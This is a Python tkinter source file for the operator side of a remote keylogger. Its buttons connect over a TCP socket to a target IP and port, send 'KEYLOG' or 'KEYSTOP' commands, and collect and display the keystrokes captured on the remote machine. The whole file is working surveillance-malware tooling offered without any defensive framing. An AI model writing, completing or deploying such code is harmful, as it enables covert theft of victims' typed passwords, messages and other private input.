from tkinter import *
from tkinter import ttk
import threading
import socket
# pip install pillow
from PIL import Image, ImageTk
from pyautogui import scroll
class KeyloggerWindow(Frame):
    def __init__(self,master,ip,port_no):
        Frame.__init__(self, master)
        self.master=Toplevel(master)
        self.master.resizable(FALSE, FALSE)
        self.master.columnconfigure(0, weight=1)
        self.master.columnconfigure(1, weight=1)
        self.master.columnconfigure(2, weight=1)
        self.master.columnconfigure(3, weight=1)
        self.ip=ip
        self.port_no=port_no
    
        hookButton = ttk.Button(self.master, text='Hook',command=self.manageEventHook)
        hookButton.grid(row=0,column=0,padx=10,pady=10,sticky='w')

        unHookButton = ttk.Button(self.master, text='Unhook',command=self.eventUnhook)
        unHookButton.grid(row=0,column=1,sticky='w')
        
        printButton = ttk.Button(self.master, text='Print',command=self.eventPrint)
        printButton.grid(row=0,column=2,sticky='e')

        deleteButton = ttk.Button(self.master, text='Delete',command=self.eventDelete)
        deleteButton.grid(row=0,column=3,padx=10,pady=10,sticky='e')
        #file status
        self.textMulti=Text(self.master)
        self.textMulti.grid(row=1,column=0,columnspan=4,padx=10,pady=10)
        self.textMulti.configure(state='disabled')


    def loadKeyLog(self):
        self.master.wm_title("Keylogger")
        self.master.geometry('510x400')
        self.master.mainloop()
    def manageEventHook(self):
        threading.Thread(target=self.eventHook).start()
    def eventHook(self):
        cmd = "KEYLOG"
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port_no))
        self.connection.send(cmd.encode())
        conn = self.connection
        while True:
            self.data = conn.recv(1024)
            if not self.data:
                break
            self.result = self.data.decode()
        
    def eventUnhook(self):
        cmd = "KEYSTOP"
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port_no))
        self.connection.send(cmd.encode())
    def eventPrint(self):
        try:
            self.textMulti.configure(state='normal')
            self.textMulti.insert(END,str(self.result))
            self.textMulti.configure(state='disabled')
            self.data=""      
        except:
            print('No')    
    def eventDelete(self):
        self.textMulti.configure(state='normal')
        self.textMulti.delete('1.0',END)
        self.textMulti.configure(state='disabled')
